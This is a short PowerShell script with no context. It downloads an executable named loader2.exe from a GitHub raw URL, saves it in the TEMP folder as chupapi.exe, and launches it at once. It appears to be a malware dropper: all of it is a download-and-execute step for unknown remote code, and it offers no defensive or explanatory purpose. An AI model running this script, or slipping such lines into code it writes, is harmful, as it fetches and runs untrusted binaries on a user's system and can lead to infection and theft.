$url = "https://github.com/putin22222/test/raw/refs/heads/main/loader2.exe"
$out = "$env:TEMP\chupapi.exe"
(New-Object Net.WebClient).DownloadFile($url, $out)
Start-Process $out
